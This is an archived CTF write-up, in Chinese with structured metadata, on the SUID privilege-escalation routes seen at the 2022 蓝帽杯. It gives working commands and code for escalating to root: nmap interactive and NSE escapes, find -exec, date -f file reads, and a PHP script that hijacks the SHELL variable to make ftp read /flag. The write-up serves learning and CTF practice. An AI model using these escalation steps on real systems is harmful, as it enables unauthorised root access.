---
title: 2022 蓝帽杯 SUID 提权 总结篇
contest: 蓝帽杯 2022
year: 2022
difficulty: medium
vuln_type:
- auth_bypass
- misc_unknown
tags:
- SUID
- find
- nmap
- nse
- lua
- ftp
- date
- find-exec
- env-var
- SHELL-override
attack_chain:
- find SUID 文件：find / -user root -perm -4000 2>/dev/null
- nmap --interactive 进入交互模式 !sh 提权
- sudo nmap --script=/tmp/shell.nse 跑 lua 脚本
- find -exec whoami ; 用空格 + 分号执行命令
- date -f /flag 触发错误读文件
- putenv('SHELL=/usr/bin/od') 劫持 SHELL 环境变量
- proc_open ftp + 管道输入 ! /flag 读文件
key_payload: nmap --interactive → !sh / sudo nmap --script=shell.nse
one_liner: SUID 提权 5 种经典路径：nmap / find-exec / date -f / ftp env / SHELL hijack
lesson: SUID 位运行 root 程序时应避免调用外部命令或保留 SHELL 路径；sudo nmap 加载 lua 脚本是 GTFObins 经典
quality: high
full_path: 2022蓝帽杯遇见的_SUID_提权_总结篇.full.md
meta_path: 2022蓝帽杯遇见的_SUID_提权_总结篇.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2022 蓝帽杯 SUID 提权 总结篇。SUID 提权 5 种经典路径：nmap / find-exec / date -f / ftp env / SHELL hijack。关键路径：find SUID 文件：find / -user root -perm -4000 2>/dev/null → nmap --interactive 进入交互模式 !sh 提权 → sudo nmap -...
category: web
subcategory: logic
subcategories:
- logic
- misc_other
tools_used:
- nmap
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/68117.html
reasoning_chain:
- 蓝帽杯拿到低权限 shell → 触发点：SUID 提权
- 假设：find SUID root 程序 → 动作：find / -user root -perm -4000 -print 2>/dev/null → 观察：/usr/bin/nmap / date / find
- 假设：nmap --interactive 进入交互模式 → 动作：nmap --interactive → !sh → 观察：root shell
- 假设：nmap < 5.21 可走 NSE 脚本 → 动作：echo "os.execute('/bin/sh')" > /tmp/shell.nse → sudo nmap --script=/tmp/shell.nse → shell
- 假设：find -exec 也可提权 → 动作：find . -exec command ; → 观察：root 执行
- 假设：date -f /flag 读文件触发错误 → 动作：date -f /flag → 观察：invalid date + flag 字符串
- 假设：SHELL 环境变量劫持 → 动作：export SHELL=/tmp/evil.sh → 程序读 SHELL 启动 → shell
failed_attempts:
- 试图 sudo -l → 失败：当前用户不在 sudoers
- 试图 cron /etc/cron.d/ 写任务 → 失败：权限不够
- 试图 wget 下载 root 脚本 → 失败：目录无写权限
key_observations:
- SUID root 程序调用外部命令或保留 SHELL 路径 = 可提权
- nmap < 5.21 --interactive + !sh 是 GTFOBins 经典
- find -exec 必带空格 + 分号才能执行命令
- date -f 读文件触发 invalid date 错误泄漏文件内容
- SHELL 环境变量劫持 suid 程序是 PATH 劫持变种
prerequisites:
- Linux 文件权限（SUID / 4000）
- find / locate SUID 程序
- GTFOBins 数据库查询
- Linux 环境变量与 SHELL 路径劫持
---
# 2022蓝帽杯遇见的 SUID 提权 总结篇

> 原文: https://www.ctfiot.com/68117.html
> ID: 68117

推荐阅读：

CobaltStrike beacon二开指南

Edge浏览器-通过XSS获取高权限从而RCE

The End of AFR?

java免杀合集

ATT&CK中的攻与防——T1059

跳跳糖持续向广大安全从业者征集高质量技术文章，可以是漏洞分析，事件分析，渗透技巧，安全工具等等。

通过审核且发布将予以500RMB-1000RMB不等的奖励，具体文章要求可以查看“投稿须知”。

阅读更多原创技术文章，戳“阅读全文”


```
    #include <stdio.h>

int main()
{
    /* 我的第一个 C 程序 */
    printf("Hello, normal! n");

    return 0;
}
    #include <stdio.h>

int main()
{
    /* 我的第一个 C 程序 */
    printf("Hello, root! n");

    return 0;
}
chmod u+s filename   设置SUID位
chmod u-s filename   去掉SUID设置 
  u代表文件所属者，suid权限是针对文件所属者而言的，只能对其所属者设置
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;

-user 指定文件拥有者
-perm 文件权限
-exec 执行系统命令
nmap --interactive

之后执行:
nmap> !sh
sh-3.2
# whoami
root

//这是真正意义上的提权，进入到了root用户的shell
echo "os.execute('/var/www/html/root-see.out')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse

.nse文件是nmap的定制脚本文件，用lua语言写的
find  -exec whoami ; 
  这个;必须要有，而且和命令前要有个空格
  -exec：<执行指令>：假设find指令的回传值为True，就执行该指令；
  -true：将find指令的回传值皆设为True； 这个可能会用到
命令格式
  date -f/--file <filename>

  -f, --file=DATEFILE：类似于--date; 一次从DATEFILE处理一行。
/*
* Do a shell escape
*/
void
shell(const char *arg)
{
    int pid;
    void (*old1)(int);
    void (*old2)(int);
    char shellnam[40];
    const char *theshell, *namep; 

    old1 = signal (SIGINT, SIG_IGN);
    old2 = signal (SIGQUIT, SIG_IGN);
    if ((pid = fork()) == 0) {
        for (pid = 3; pid < 20; pid++)
            (void) close(pid);
        (void) signal(SIGINT, SIG_DFL);
        (void) signal(SIGQUIT, SIG_DFL);
        //从环境变量中取SHELL变量
        theshell = getenv("SHELL");
        if (theshell == NULL)
            theshell = _PATH_BSHELL;
        namep = strrchr(theshell, '/');
        if (namep == NULL)
            namep = theshell;
        else 
            namep++;
        (void) snprintf(shellnam, sizeof(shellnam), "-%s", namep);
        if (strcmp(namep, "sh") != 0)
            shellnam[0] = '+';
        if (debug) {
            printf("%sn", theshell);
            (void) fflush (stdout);
        }
        if (arg) {
            execl(theshell, shellnam, "-c", arg, NULL);
        }
        else {
            execl(theshell, shellnam, NULL);
        }
        perror(theshell);
        code = -1;
        exit(1);
    }
    if (pid > 0) while (wait(NULL) != pid);

    (void) signal(SIGINT, old1);
    (void) signal(SIGQUIT, old2);
    if (pid == -1) {
        perror("Try again later");
        code = -1;
    }
    else {
        code = 0;
    }
}
putenv("SHELL=/usr/bin/od");
$descriptorspec = array(
   0 => array("pipe", "r"), // 标准输入，子进程从此管道中读取数据
   1 => array("pipe", "w"), // 标准输出，子进程向此管道中写入数据
   2 => array("pipe", "r")
);

$file=array();

$process = proc_open("ftp", $descriptorspec, $file);

var_dump($process);
var_dump($file);

function readln($file){
    $out = "";
    $a = fread($file, 1);
    echo "readln";
    while ($a != "n") {
        $out = $out.$a;
        $a = fread($file, 1);
    }
    return $out;
}

fputs($file[0], "! /flagn");
sleep("2");
$data = readln($file[1]);
echo $data;
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]